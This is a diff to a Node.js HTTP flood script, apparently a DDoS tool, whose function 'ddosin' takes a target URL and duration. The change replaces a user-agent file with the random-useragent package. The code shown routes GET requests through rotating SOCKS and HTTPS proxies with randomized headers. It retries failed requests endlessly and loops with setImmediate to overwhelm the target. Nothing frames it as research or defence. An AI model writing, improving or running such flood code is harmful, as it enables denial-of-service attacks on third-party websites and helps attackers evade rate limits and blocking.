@@ -2,6 +2,7 @@ const fs = require('fs');
 const axios = require('axios');
 const SocksProxyAgent = require('socks-proxy-agent');
 const HttpsProxyAgent = require('https-proxy-agent');
+const randomUseragent = require('random-useragent');
 
 function ddosin(targetUrl, durasi){
 
@@ -365,23 +366,15 @@ return [];
 }
 }
 
-function readUserAgentList() {
-try {
-const data = fs.readFileSync(uaListFile, 'utf-8').replace(/\r/g, '').split('\n');
-return data.map(line => line.trim());
-} catch (error) {
-console.error(`Failed to read user agent list: ${error}`);
-return [];
-}
-}
-
 function getRandomElement(arr) {
 return arr[Math.floor(Math.random() * arr.length)];
 }
-const proxyListFile = 'proxy.txt';
-const uaListFile = 'ua.txt';
 
-function sendRequest(target, agent, userAgent) {
+const proxyListFile = 'proxy.txt';
+
+function sendRequest(target, agent) {
+const userAgent = randomUseragent.getRandom();
+
 const headers = {
  'User-Agent': userAgent,
  'Accept': getRandomElement(acceptHeader),
@@ -399,26 +392,24 @@ axios.get(target, { httpAgent: agent, headers: headers })
 .then(response => {
 })
 .catch(error => {
-sendRequest(target, agent, userAgent);
+sendRequest(target, agent);
 });
 }
 
 function sendRequests() {
 const proxyList = readProxyList();
-const userAgentList = readUserAgentList();
 let currentIndex = 0;
 
 function sendRequestUsingNextProxy() {
 if (currentIndex < proxyList.length) {
  const proxyUrl = proxyList[currentIndex];
- const userAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];
  let agent;
  if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
  agent = new SocksProxyAgent(proxyUrl);
  } else if (proxyUrl.startsWith('https')) {
  agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) });
  }
- sendRequest(targetUrl, agent, userAgent);
+ sendRequest(targetUrl, agent);
  currentIndex++;
  setImmediate(sendRequestUsingNextProxy);
 } else {
